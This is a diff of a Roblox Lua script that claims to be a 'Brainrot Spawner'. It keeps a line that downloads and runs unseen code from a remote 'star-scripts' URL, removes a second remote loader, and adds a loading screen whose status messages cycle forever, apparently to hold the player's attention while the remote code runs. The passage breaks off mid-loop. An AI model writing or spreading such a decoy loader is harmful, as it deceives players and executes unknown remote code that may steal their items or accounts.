@@ -1,2 +1,111 @@
 loadstring(game:HttpGet("https://star-scripts.com/api/run/HAGko_mk9Q3ueW6Qzo4kZICcoCpyQdj-"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/BrainrotSpwner.lua"))()
+-- Loading Brainrot Spawner - Visual GUI
+-- Small draggable loading screen
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Remove old GUI if it exists
+local oldGui = playerGui:FindFirstChild("BrainrotSpawnerLoading")
+if oldGui then
+	oldGui:Destroy()
+end
+
+-- ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "BrainrotSpawnerLoading"
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+-- Main Frame
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = UDim2.new(0, 330, 0, 145)
+main.Position = UDim2.new(0.5, -165, 0.5, -72)
+main.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+main.BorderSizePixel = 0
+main.Active = true
+main.Draggable = true
+main.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = main
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -30, 0, 45)
+title.Position = UDim2.new(0, 15, 0, 12)
+title.BackgroundTransparency = 1
+title.Text = "Loading Brainrot Spawner"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 20
+title.Font = Enum.Font.GothamBold
+title.Parent = main
+
+-- Status text
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -30, 0, 30)
+status.Position = UDim2.new(0, 15, 0, 60)
+status.BackgroundTransparency = 1
+status.Text = "Loading..."
+status.TextColor3 = Color3.fromRGB(180, 180, 180)
+status.TextSize = 15
+status.Font = Enum.Font.Gotham
+status.Parent = main
+
+-- Loading bar background
+local barBackground = Instance.new("Frame")
+barBackground.Size = UDim2.new(1, -40, 0, 8)
+barBackground.Position = UDim2.new(0, 20, 1, -30)
+barBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+barBackground.BorderSizePixel = 0
+barBackground.Parent = main
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1, 0)
+barCorner.Parent = barBackground
+
+-- Moving loading bar
+local loadingBar = Instance.new("Frame")
+loadingBar.Size = UDim2.new(0.35, 0, 1, 0)
+loadingBar.Position = UDim2.new(0, 0, 0, 0)
+loadingBar.BackgroundColor3 = Color3.fromRGB(120, 80, 255)
+loadingBar.BorderSizePixel = 0
+loadingBar.Parent = barBackground
+
+local loadingCorner = Instance.new("UICorner")
+loadingCorner.CornerRadius = UDim.new(1, 0)
+loadingCorner.Parent = loadingBar
+
+-- Infinite loading messages
+local messages = {
+	"Loading...",
+	"Configuring spawner...",
+	"Checking assets...",
+	"Initializing system...",
+	"Loading modules...",
+	"Preparing Brainrot Spawner...",
+	"Please wait..."
+}
+
+-- Infinite message loop
+task.spawn(function()
+	local index = 1
+
+	while gui.Parent do
+		status.Text = messages[index]
+
+		index += 1
+		if index > #messages then
+			index = 1
+		end
+
+		task.wait(1.5)
+	end
+end)
+
+-- Infinite moving loading bar
+task.spawn(function()
+	while
